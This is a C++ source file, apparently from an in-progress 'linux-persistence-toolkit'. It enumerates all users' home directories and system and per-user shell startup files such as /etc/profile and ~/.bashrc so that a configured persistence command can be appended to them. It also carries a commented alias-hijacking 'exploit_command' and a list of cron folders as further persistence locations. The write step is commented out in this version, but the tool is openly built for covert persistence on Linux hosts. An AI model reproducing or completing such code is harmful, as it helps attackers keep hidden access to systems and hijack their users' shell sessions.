#include <algorithm>
#include <cstring>
#include <filesystem>
#include <iostream>
#include <fstream>
#include <string>
#include <vector>
#include <wordexp.h>
#include <pwd.h>
#include <string.h>
#include "settings.hpp"
using namespace std;

static string parse_path(string path_to_parse){    
    wordexp_t p;
    char** w;
    wordexp( path_to_parse.c_str(), &p, 0 );
    w = p.we_wordv;
    string output;
    for (size_t i=0; i<p.we_wordc;i++ ) {
        output += w[i];
        //output += "\n";
    }
    wordfree( &p );
    return output;
}

static void file_wrapper(string file_to_open, string content){
    ofstream myfile;
    string parsed_path = parse_path(file_to_open);
    myfile.open(parsed_path, ios::app | ios::out);
    myfile << content;
}

static std::vector<string> get_homedirs() {
    std::vector<string> return_items;

    for (const auto & entry : std::filesystem::directory_iterator("/home/")) {
        return_items.push_back(entry.path());
    }
    endpwent();

    // Remove any empty strings that may have been added due to the initial capacity of 16
    return_items.resize(count_if(return_items.begin(), return_items.end(), [](const string &s) { return !s.empty(); }));
    return return_items;
}




int main(){
    std::cout << BANNER;
    std::cout << "Using persist command of " << PERSIST_COMMAND << endl;
    /*for (int i = 0; i < (int) get_homedirs().size(); ++i) {
        cout << get_homedirs()[i] << endl;
    }*/


    /*
    ██████   █████  ███████ ██   ██ ██████   ██████      █████  ██      ██  █████  ███████ 
    ██   ██ ██   ██ ██      ██   ██ ██   ██ ██          ██   ██ ██      ██ ██   ██ ██      
    ██████  ███████ ███████ ███████ ██████  ██          ███████ ██      ██ ███████ ███████ 
    ██   ██ ██   ██      ██ ██   ██ ██   ██ ██          ██   ██ ██      ██ ██   ██      ██ 
    ██████  ██   ██ ███████ ██   ██ ██   ██  ██████     ██   ██ ███████ ██ ██   ██ ███████ 
    */
    string bashrc_alias_files[] = {
        "/etc/profile", "/etc/bash.bashrc", "~/.bash_profile",
        "~/.bash_login", "~/.profile", "~/.bash_logout", "/etc/bash.bash_logout",
        "~/.bashrc"
    };
    //exploit_command = `alias -p *=echo 'Executing command: $1' && $1`
    for (auto &str : bashrc_alias_files) {
        if(str.starts_with("~"sv)){ // if we have a tilde based path, we want to do this to all users
            for (int i = 0; i < (int) get_homedirs().size(); ++i) { // for each user we can discover
                string stripped = str;
                stripped.erase(0, 1);
                cout << "Accessing file... " << get_homedirs()[i] << stripped << endl;
            }
        }else { // if its a universal path
            cout << "Accessing file... " << str << endl;
        }
    }

    
    //file_wrapper("~/linux-persistence-toolkit/test.txt", PERSIST_COMMAND);
    return 0;
}


/*
bashrc files:
/etc/profile 
/etc/profile.d/.sh
/etc/bash.bashrc
~/.bash_profile 
~/.bash_login
~/.profile
~/.bash_logout
/etc/bash.bash_logout
~/.bashrc 

cron folders:
/etc/cron.hourly, /etc/cron.daily, /etc/cron.weekly, /etc/cron.monthly
*/
